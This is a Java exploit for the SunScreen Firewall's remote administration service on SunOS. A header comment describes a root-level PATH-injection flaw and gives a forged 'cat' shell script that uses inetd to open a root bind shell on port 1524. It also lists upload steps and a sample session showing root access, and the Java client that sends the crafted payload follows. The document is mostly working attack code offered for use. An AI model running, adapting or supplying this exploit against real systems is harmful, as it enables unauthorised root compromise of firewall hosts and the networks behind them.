/*

Sun Microsystems SunScreen Firewall Root Exploit
discovered & exploited by Kingcope
January 2011

The SunScreen Firewall can be administrated remotely via a java protocol service
which is running on port 3858 on a SunOS machine.

This Java Service contains numerous buffer overruns (2 of which I am aware of).
Furthermore it is possible to execute arbitrary code if an attacker manages
to upload a file onto the target system.

As you can see in the following java exploit code the environment
is not properly sanitized prior to executing shell scripts as root,
thus one can use the LD technique to preload binaries or even easier
modify the PATH variable to forge the �cat� binary (which is executed by lib/screenname)
to be executed in a different place.

This can be exploited locally - remotely especially if anonymous ftp uploads
are possible or any other file transfer protocol is activated. Uploading
a file via the line printer daemon might also be possible.

This has been tested on a SunOS 5.9.

The shell script to be forged as the �cat� binary..

#!/bin/sh
echo "ingreslock stream tcp nowait root /bin/sh sh -i">/tmp/x;
/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x
echo "+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++"
#---

upload above shell script to /PATH/cat
chmod a+x /PATH/cat
supply target and PATH envvar to exploit

Opens a root shell on port 1524/tcp (ingreslock)
A successfull exploit looks like

$ java SimpleClient

�              ?       ??�?    &Connection accepted, no authentication�?     O
      +++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED YA+++ WE OWNED Y
A+++

$ telnet 192.168.2.3 1524
Trying 192.168.2.3...
Connected to 192.168.2.3.
Escape character is '^]'.
# /bin/uname -a;
SunOS unknown 5.9 Generic_118558-34 sun4u sparc SUNW,Ultra-5_10
                                                               ^M: not found
                                                                            # /b
in/id;
uid=0(root) gid=1(other)
                        ^M: not found
                                     #

*/

    import java.net.*;
    import java.io.*;
    import java.util.*;
    import java.text.DateFormat;
    public class SimpleClient {
	    
    public static void main(String args[]) {
	    
    String str;

    try {

    Socket s1 = new Socket("192.168.2.3", 3853);

    InputStream is = s1.getInputStream();

    DataInputStream dis = new DataInputStream(is);

    OutputStream s1out = s1.getOutputStream();
    DataOutputStream dos = new DataOutputStream(s1out);

    dos.writeByte(1);
    dos.writeByte(0);
    dos.writeShort(0);
    dos.writeInt(0);
    dos.writeByte(3);
    dos.writeByte(0);
    dos.writeShort(2000);
    dos.writeShort(0);
    dos.writeShort(0);

    dos.writeUTF("0xtest");
    dos.writeByte(3);
    dos.writeByte(1);
    dos.writeByte(1);
    dos.writeByte(1);
    dos.writeInt(3);
    dos.writeInt(0);
    dos.writeInt(0);
       
    dos.writeUTF("PATH=/tmp");
    dos.writeUTF("lib/screenname");

    dos.writeUTF("admin1");
    
    str = dis.readLine();
    System.out.println(str);    
    
    str = dis.readLine();
    System.out.println(str);
    
    dis.close();
    dos.close();
    s1.close();
    } catch (ConnectException connExc) {
    System.err.println("Could not connect to the server.");
    } catch (IOException e) {
    // foo
    }
    }
    }